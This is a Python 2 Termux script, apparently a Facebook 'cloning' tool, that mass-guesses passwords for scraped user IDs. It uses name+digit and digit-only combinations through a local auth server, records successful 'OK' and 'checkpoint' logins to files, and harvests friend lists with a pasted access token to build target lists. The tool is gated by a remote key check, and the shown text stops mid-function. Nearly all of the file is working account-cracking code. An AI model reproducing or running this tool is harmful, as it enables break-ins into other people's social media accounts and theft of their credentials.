#!/usr/bin/python
# -*- coding: utf-8

try:
    import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib, requests, uuid, string
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 filecr3k.py')
    
from os import system
from time import sleep
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
try:
    import requests
except ImportError:
    system('pip2 install requests > /dev/null 2>&1 &')
    system('pip2 install requests > /dev/null 2>&1 &')

def xogo():
	os.system('echo  "\n\n    ▄▄▄      ▒███████▒ ██▓ ███▄ ▄███▓\n   ▒████▄    ▒ ▒ ▒ ▄▀░▓██▒▓██▒▀█▀ ██▒\n   ▒██  ▀█▄  ░ ▒ ▄▀▒░ ▒██▒▓██    ▓██░\n   ░██▄▄▄▄██   ▄▀▒   ░░██░▒██    ▒██ \n    ▓█   ▓██▒▒███████▒░██░▒██▒   ░██▒\n    ▒▒   ▓▒█░░▒▒ ▓░▒░▒░▓  ░ ▒░   ░  ░\n     ▒   ▒▒ ░░░▒ ▒ ░ ▒ ▒ ░░  ░      ░\n     ░   ▒   ░ ░ ░ ░ ░ ▒ ░░      ░   \n         ░  ░  ░ ░     ░         ░   \n             ░                       \n\n╔═══════════════════════════════════════════╗\n║  Author   : Mahmud Azim                   ║\n║  Github   : https://github.com/Azim-Vau   ║           \n║  Fb       : https://me.fb/AzimVau69       ║           \n╚═══════════════════════════════════════════╝" | lolcat ')	


try:
    import requests
    os.system("clear")
except ImportError:
    print '\n\x1b[1;91mUnable to Install requests !'
    os.sys.exit()

azim = requests.get('https://pastebin.com/raw/DAJH4Aqv')
lulu = azim.text
xogo()
print ("")
hulu = raw_input("\x1b[1;93m KEY PASSWORD :\x1b[1;92m ")
if lulu == hulu:
	os.system('clear')
	time.sleep(0.1)
	pass

else:

     jalan( "\x1b[1;91m WRONG PASSWORD... *_+\n")
     os.sys.exit()


   
### MY COLORS ###
P = '\x1b[1;97m' # 
M = '\x1b[1;91m' #
H = '\x1b[1;92m' #
K = '\x1b[1;93m' # 
B = '\x1b[1;94m' #
U = '\x1b[1;95m' #
O = '\x1b[1;96m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
def tok():
    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for y in titik:
        print '\r %s[%s*%s] CHECKING KEY %s '%(P,O,P,y),
        sys.stdout.flush()
        time.sleep(0.2)
    
### LICENSE ###
def key_check():
	try:
		toket = open('/sdcard/Android/.lohost.txt','r').read()
	except IOError:
		os.system('clear')
		print "\n %s[%s!%s] LICENSE INVALID"%(P,M,P)
		os.system('clear')
		os.system('rm -rf /sdcard/Android/.lohost.txt')
		success()
	if os.path.exists('/sdcard/Android/.lohost.txt'):
		hoynai()
	else:
		success()
		
def success():
    os.system('clear')
    logo()
    azim()
    tok()
    id = "LOCAL"+uuid.uuid4().hex[:11]+"HOST"
    idg = open('/sdcard/Android/.lohost.txt', 'w')
    idg.write(id)
    idg.close()
    time.sleep(2)
    print '\n\x1b[1;97m [\x1b[1;91m~\x1b[1;97m]\x1b[1;91m API KEY HAS NOT BEEN CONFIRMED'
    time.sleep(2)
    print '\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]\x1b[1;93m YOUR KEY: \x1b[1;92m' + id
    print '\x1b[1;97m [\x1b[1;93m-\x1b[1;97m]\x1b[1;96m PRESS ENTER TO CONFIRM API KEY'
    raw_input('\n %s[%s ENTER %s]%s '%(B,K,B,N))
    os.system('am start https://wa.me/'+requests.get('https://raw.githubusercontent.com/Azim-vau/server/main/x.txt').text.strip()+'?text=Hi,+M4.+3Rr4,+please+confirm+my+api+key+code+:%20' + id + ' >/dev/null')
    exit()
    
#https://pastebin.com/raw/rEjS7iYg
def hoynai():
    try:
        catkey = open('/sdcard/Android/.lohost.txt', 'r').read()
        plr = requests.get('https://raw.githubusercontent.com/Azim-vau/xbomb/main/lhost.txt')
        azimx = plr.text
        if catkey in azimx:
            os.system("clear")
            logo()     
            azim()
            tok()
            jalan('\n %s[%s✓%s]%s LOGIN SUCCESSFUL'%(P,H,P,H))
            time.sleep(2)
            execut()   
          
        else:
            os.system("clear")
            logo()
            azim()
            print ''
            tok()
            print '\n %s[%s×%s] LOGIN STATUS %sFAILED'%(P,M,P,M)
            time.sleep(2)
            print '\x1b[1;97m [\x1b[1;91m~\x1b[1;97m]\x1b[1;91m API KEY HAS NOT BEEN CONFIRMED'
            time.sleep(2)
            print '\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]\x1b[1;93m YOUR KEY: \x1b[1;92m' + catkey
            print ''
            print '\x1b[1;97m [\x1b[1;93m-\x1b[1;97m]\x1b[1;96m PRESS ENTER TO CONFIRM API KEY'
            raw_input('\n %s[%s ENTER %s]%s '%(B,K,B,N))
            os.system('am start https://wa.me/'+requests.get('https://raw.githubusercontent.com/Azim-vau/server/main/x.txt').text.strip()+'?text=Hi,+M4.+3Rr4,+please+confirm+my+api+key+code+:%20' + catkey + ' >/dev/null')
            exit()
    except requests.exceptions.ConnectionError:
        print '\n %s[%s!%s] no connection'%(P,M,P)
        raw_input(' %s[ %sBACK%s ] '%(P,O,P))
        exit()
    except KeyboardInterrupt:
        os.sys.exit()
    except IOError:
        subprocess.Popen(['rm', '-rf', '/sdcard/Android/.lohost.txt'])
        success()
        
if not os.path.isfile('/data/data/com.termux/files/usr/bin/node'):
    os.system('apt update && apt install nodejs -y')
os.system('git pull')

from requests.exceptions import ConnectionError
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding('utf8')
def azim():
	os.system('echo  "\n=============================================\n" | lolcat ')
def logo():
	os.system('echo  "\n\n    ▄▄▄      ▒███████▒ ██▓ ███▄ ▄███▓\n   ▒████▄    ▒ ▒ ▒ ▄▀░▓██▒▓██▒▀█▀ ██▒\n   ▒██  ▀█▄  ░ ▒ ▄▀▒░ ▒██▒▓██    ▓██░\n   ░██▄▄▄▄██   ▄▀▒   ░░██░▒██    ▒██ \n    ▓█   ▓██▒▒███████▒░██░▒██▒   ░██▒\n    ▒▒   ▓▒█░░▒▒ ▓░▒░▒░▓  ░ ▒░   ░  ░\n     ▒   ▒▒ ░░░▒ ▒ ░ ▒ ▒ ░░  ░      ░\n     ░   ▒   ░ ░ ░ ░ ░ ▒ ░░      ░   \n         ░  ░  ░ ░     ░         ░   \n             ░                       \n\n╔═══════════════════════════════════════════╗\n║  Author   : Mahmud Azim                   ║\n║  Github   : https://github.com/Azim-Vau   ║           \n║  Fb       : https://me.fb/AzimVau69       ║           \n╚═══════════════════════════════════════════╝" | lolcat ')	

def execut():
	os.system('clear')
	logo()
	print ''
	print '\t     \x1b[1;92mEXECUTING SCRIPT\x1b[0m'
	print ''
	os.system('cd AZIM && npm install')
	os.system('fuser -k 5000/tcp &')
	os.system('#')
	os.system('cd AZIM && node index.js &')
	time.sleep(10)
	method()
	
def method():
    os.system('clear')
    logo()
    print ''
    print '\t\x1b[1;92m     SELECT CLONING '
    print ''
    print '\x1b[1;93m[1] LOGIN CLONING'
    print '\x1b[1;94m[0] EXIT'
    print ''
    ms()

def ms():
    s = raw_input('\x1b[1;92m CHOOSE OPINION : ')
    if s == '1':
        login()
    elif s == '0':
        os.sys.exit()
    else:
        print ''
        print '\t\x1b[1;91mSELECT VALID  OPTION'
        print ''
        ms()
        
def login():
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
        menu()
    except (KeyError, IOError):
        logo()
        print ''
        print '\t\x1b[1;92m    LOGIN WITH ACCESS TOKEN'
        print ''
        token = raw_input('\x1b[1;93m PASTE TOKEN HEAR : \x1b[1;92m')
        sav = open('access_token.txt', 'w')
        sav.write(token)
        sav.close()
        menu()


def menu():
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        login()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token, headers=header)
        q = json.loads(r.text)
        name = q['name']
    except KeyError:
        logo()
        print ''
        print '\t\x1b[1;91m LOGGED IN TOKEN HAS EXPIRED'
        print ''
        time.sleep(1)
        os.system('rm -rf access_token.txt')
        login()

    os.system('clear')
    ip = requests.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
    logo()
    print ''
    print "\x1b[1;93m YOUR IP ADDRESS : \x1b[1;92m" + ip
    print ''
    print '\x1b[1;93m LOGGED IN USER : \x1b[1;92m' + name
    print ''
    print '\t\x1b[1;93m   ACTIVATION :\x1b[1;92m FREE MODE'
    print ''
    azim()
    print ''
    print '\x1b[1;93m [1] CRACK WITH NAME PASS'
    print '\x1b[1;94m [2] CRACK WITH DIGITE PASS'
    print '\x1b[1;95m [3] CRACK WITH DIGITE + NAME PASS TOTAL 10'
    print '\x1b[1;92m [4] EXTRACT USER IDS FROM PUBLIC'
    print '\x1b[1;91m [0] BACK'
    print ''
    menu_option()


def menu_option():
    select = raw_input('\x1b[1;92m CHOOSE OPINION: ')
    if select == '1':
        crack()
    elif select == '2':
        choice()
    elif select == '3':
        crack_choice()
    elif select == '4':
    	ex_id()
    elif select == '0':
    	method()
    else:
        print ''
        print '\t\x1b[1;91mSELECT VALID OPTION'
        print ''
        menu_option()

def crack_choice():
    global token
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
    except IOError:
        print ''
        print '\t\x1b[1;91mToken not found '
        time.sleep(1)
        login_choice()

    os.system('clear')
    logo()
    print ''
    print '\t\x1b[1;92mCRACK WITH NAME PASS'
    print ''
    print '\x1b[1;92m[1] CRACK FILE'
    print '\x1b[1;91m[0] BACK'
    print ''
    crack_select1()


def crack_select1():
    select = raw_input('\x1b[1;92m CHOOSE OPINION: ')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        logo()
        print ''
        print '\t\x1b[1;93m  NAME PASS CRACKING'
        print "\n\x1b[1;92m EXAMPLE : 12 1122 1234 321 ETC"
        print ''
        p1 = raw_input('\x1b[1;93m [01] NAME + YOUR DIGIT: ')
        p2 = raw_input('\x1b[1;94m [02] NAME + YOUR DIGIT: ')
        p3 = raw_input('\x1b[1;95m [03] NAME + YOUR DIGIT: ')
        p4 = raw_input('\x1b[1;96m [04] NAME + YOUR DIGIT: ')
        print "\n\x1b[1;92m EXAMPLE : 223344 334455 556677 786000 ETC\n"
        pass5 = raw_input('\x1b[1;93m [05] DIGIT PASS: ')
        pass6 = raw_input('\x1b[1;94m [06] DIGIT PASS: ')
        pass7 = raw_input('\x1b[1;95m [07] DIGIT PASS: ')
        pass8 = raw_input('\x1b[1;96m [08] DIGIT PASS: ')
        pass9 = raw_input('\x1b[1;93m [09] DIGIT PASS: ')
        pass10 = raw_input('\x1b[1;94m [10] DIGIT PASS: ')
        try:
            filelist = raw_input('\x1b[1;92m\n INPUT FILE : ')
            os.system('clear')
            logo()
            print ''
            print '\t\x1b[1;92m  NAME PASS CRACKING'
            print ''
            for line in open(filelist, 'r').readlines():
                id.append(line.strip())

        except (KeyError, IOError):
            print ''
            print '\t\x1b[1;91mRequested file not found'
            print ''
            raw_input('\x1b[1;93m PRESS ENTER TO BACK ')
            crack_choice()

    elif select == '0':
        menu()
    else:
        print ''
        print '\t\x1b[1;91mSELECT VALID OPTION'
        print ''
        crack_select1()
    print '\x1b[1;93m TOTAL IDS : \x1b[1;92m' + str(len(id))
    print '\x1b[1;92m THE PROCESS HAS STARTED'
    azim()
    print ''

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name.lower() + p1
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print ' \x1b[1;32m[AZIM-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/AZIM_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print ' \x1b[1;33m[AZIM-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('checkpoint.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + p2
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print ' \x1b[1;32m[AZIM-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/AZIM_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print ' \x1b[1;33m[AZIM-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('checkpoint.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + p3
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print ' \x1b[1;32m[AZIM-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/AZIM_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print ' \x1b[1;33m[AZIM-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        cp = open('checkpoint.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + p4
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print ' \x1b[1;32m[AZIM-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/AZIM_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print ' \x1b[1;33m[AZIM-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            cp = open('checkpoint.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print ' \x1b[1;92m[AZIM-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/AZIM_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print ' \x1b[1;33m[AZIM-CP] ' + uid + ' | ' + pass5
                                cp = open('AZIM_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print ' \x1b[1;92m[AZIM-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/AZIM_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print ' \x1b[1;33m[AZIM-CP] ' + uid + ' | ' + pass6
                                    cp = open('AZIM_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
                                else:
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print ' \x1b[1;92m[AZIM-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('/sdcard/ids/AZIM_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print ' \x1b[1;33m[AZIM-CP] ' + uid + ' | ' + pass7
                                        cp = open('AZIM_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.apppend(uid + pass7)
                                    else:
                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print ' \x1b[1;92m[AZIM-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ok = open('/sdcard/ids/AZIM_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print ' \x1b[1;33m[AZIM-CP] ' + uid + ' | ' + pass8
                                            cp = open('AZIM_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            cps.apppend(uid + pass8)
                                        else:
                                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass9, headers=header).text
                                            q = json.loads(data)
                                            if 'loc' in q:
                                                print ' \x1b[1;92m[AZIM-OK] \x1b[1;32m' + uid + ' | ' + pass9 + '\x1b[0;97m'
                                                ok = open('/sdcard/ids/AZIM_OK.txt', 'a')
                                                ok.write(uid + ' | ' + pass9 + '\n')
                                                ok.close()
                                                oks.append(uid + pass9)
                                            elif 'www.facebook.com' in q['error']:
                                                print ' \x1b[1;33m[AZIM-CP] ' + uid + ' | ' + pass9
                                                cp = open('AZIM_CP.txt', 'a')
                                                cp.write(uid + ' | ' + pass9 + '\n')
                                                cp.close()
                                                cps.apppend(uid + pass9)
                                            else:
                                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass10, headers=header).text
                                                q = json.loads(data)
                                                if 'loc' in q:
                                                    print ' \x1b[1;92m[AZIM-OK] \x1b[1;32m' + uid + ' | ' + pass10 + '\x1b[0;97m'
                                                    ok = open('/sdcard/ids/AZIM_OK.txt', 'a')
                                                    ok.write(uid + ' | ' + pass10 + '\n')
                                                    ok.close()
                                                    oks.append(uid + pass10)
                                                elif 'www.facebook.com' in q['error']:
                                                    print ' \x1b[1;33m[AZIM-CP] ' + uid + ' | ' + pass10
                                                    cp = open('AZIM_CP.txt', 'a')
                                                    cp.write(uid + ' | ' + pass10 + '\n')
                                                    cp.close()
                                                    cps.apppend(uid + pass10)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ''
    azim()
    print ''
    print '\x1b[1;92m THE PROCESS HAS COMPLETED'
    print '\x1b[1;93m Total \x1b[1;92mOk\x1b[0m/\x1b[1;93mCp:' + str(len(oks)) + '/' + str(len(cps))
    print ''
    azim()
    print ''
    raw_input('\x1b[1;93m PRESS ENTER TO BACK')
    crack_choice()
    
def crack():
    global token
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
    except IOError:
        print ''
        print '\t\x1b[1;91mToken not found '
        time.sleep(1)
        login_choice()

    os.system('clear')
    logo()
    print ''
    print '\t\x1b[1;92mCRACK WITH NAME PASS'
    print ''
    print '\x1b[1;92m[1] CRACK FILE'
    print '\x1b[1;91m[0] BACK'
    print ''
    crack_select()


def crack_select():
    select = raw_input('\x1b[1;92m CHOOSE OPINION: ')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        logo()
        print ''
        print '\t\x1b[1;92m  NAME PASS CRACKING'
        print ''
        p1 = raw_input('\x1b[1;93m NAME + YOUR DIGIT: ')
        p2 = raw_input('\x1b[1;93m NAME + YOUR DIGIT: ')
        p3 = raw_input('\x1b[1;94m NAME + YOUR DIGIT: ')
        p4 = raw_input('\x1b[1;96m NAME + YOUR DIGIT: ')
        try:
            filelist = raw_input('\x1b[1;92m File : ')
            os.system('clear')
            logo()
            print ''
            print '\t\x1b[1;92m  NAME PASS CRACKING'
            print ''
            for line in open(filelist, 'r').readlines():
                id.append(line.strip())

        except (KeyError, IOError):
            print ''
            print '\t\x1b[1;91mRequested file not found'
            print ''
            raw_input('\x1b[1;93m PRESS ENTER TO BACK ')
            crack()

    elif select == '0':
        menu()
    else:
        print ''
        print '\t\x1b[1;91mSELECT VALID OPTION'
        print ''
        crack_select()
    print '\x1b[1;93m TOTAL IDS : \x1b[1;92m' + str(len(id))
    print '\x1b[1;92m THE PROCESS HAS STARTED'
    azim()
    print ''

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name.lower() + p1
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print ' \x1b[1;32m[AZIM-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/AZIM_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print ' \x1b[1;33m[AZIM-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('checkpoint.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + p2
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print ' \x1b[1;32m[AZIM-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/AZIM_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print ' \x1b[1;33m[AZIM-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('checkpoint.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + p3
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print ' \x1b[1;32m[AZIM-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/AZIM_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print ' \x1b[1;33m[AZIM-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        cp = open('checkpoint.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + p4
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print ' \x1b[1;32m[AZIM-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/AZIM_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print ' \x1b[1;33m[AZIM-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            cp = open('checkpoint.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ''
    azim()
    print ''
    print '\x1b[1;92m THE PROCESS HAS COMPLETED'
    print '\x1b[1;93m Total \x1b[1;92mOk\x1b[0m/\x1b[1;93mCp:' + str(len(oks)) + '/' + str(len(cps))
    print ''
    azim()
    print ''
    raw_input('\x1b[1;93m PRESS ENTER TO BACK')
    crack()
    
def ex_id():
    global token
    idg = []
    try:
        token = open('access_token.txt', 'r').read()
    except IOError:
        print '\t\x1b[1;91mToken not found'
        print ''
        time.sleep(1)
        login_choice()

    os.system('clear')
    logo()
    print ''
    print '\t\x1b[1;92mCOLLECT PUBLIC ID FRIENDLIST'
    print ''
    idh = raw_input('\x1b[1;93m INPUT ID: ')
    try:
        r = requests.get('https://graph.facebook.com/' + idh + '?access_token=' + token, headers=header)
        q = json.loads(r.text)
        print ' COLLECTIN FROM: ' + q['name']
    except KeyError:
        print ''
        print '\tInvalid id provided'
        print ''
        raw_input(' PRESS ENTER TO BACK')
        menu()

    r = requests.get('https://graph.facebook.com/' + idh + '/friends?access_token=' + token, headers=header)
    q = json.loads(r.text)
    ids = open('ids_friends.txt', 'w')
    for i in q['data']:
        uid = i['id']
        na = i['name']
        nm = na.rsplit(' ')[0]
        idg.append(uid + '|' + nm)
        ids.write(uid + '|' + nm + '\n')

    ids.close()
    print ''
    azim()
    print ''
    print '\x1b[1;92m THE PROCESS HAS COMPLETED'
#    print '\x1b[1;93m Total ids: \x1b[1;92m' + str(len(idg))
    print ''
    azim()
    print ''
    raw_input('\x1b[1;95m Press enter to download file')
    os.system('cat ids_friends.txt | grep "100069" >> /sdcard/userids.txt')
    os.system('cat ids_friends.txt | grep "100070" >> /sdcard/userids.txt')
    os.system('rm -rf ids_friends.txt')
    print '\x1b[1;93m File downloaded successfully'
    print '\x1b[1;92m Saved /sdcard/userids.txt'
    print ''
    time.sleep(0.1)
    ex_id()


def choice():
    global token
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
    except IOError:
        print ''
        print '\t\x1b[1;91mToken not found'
        time.sleep(1)
        login_choice()

    os.system('clear')
    logo()
    print ''
    print '\t\x1b[1;92mDIGITE PASS CRACKING'
    print ''
    print '\x1b[1;92m[1] CRACK FILE'
    print '\x1b[1;91m[0] BACK'
    print ''
    choice_select()


def choice_select():
    select = raw_input('\x1b[1;92mCHOOSE OPINION: ')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        logo()
        print ''
        print '\t\x1b[1;92mDIGITE PASS CRACKING'
        print ''
        pass1 = raw_input('\x1b[1;93m Password: ')
        pass2 = raw_input('\x1b[1;94m Password: ')
        pass3 = raw_input('\x1b[1;95m Password: ')
        pass4 = raw_input('\x1b[1;96m Password: ')
        filelist = raw_input(' Input file: ')
        os.system('clear')
        logo()
        print ''
        print '\t\x1b[1;92m DIGITE PASS CRACKING'
        print ''
        try:
            for line in open(filelist, 'r').readlines():
                id.append(line.strip())

        except (KeyError, IOError):
            print ''
            print '\t\x1b[1;91mRequested file not found'
            print ''
            raw_input('\x1b[1;92m PRESS ENTER TO BACK ')
            choice()

    elif select == '0':
        menu()
    else:
        print ''
        print '\t    \x1b[1;31mSELECT VALID OPTION\x1b[0;97m'
        print ''
        choice_select()
    print '\x1b[1;93m TOTAL IDS : \x1b[1;92m' + str(len(id))
    print '\x1b[1;92m THE PROCESS HAS STARTED'
    azim()
    print ''

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print ' \x1b[1;32m[AZIM-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/AZIM_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print ' \x1b[1;33m[AZIM-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('checkpoint.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print ' \x1b[1;32m[AZIM-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/AZIM_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print ' \x1b[1;33m[AZIM-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('checkpoint.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
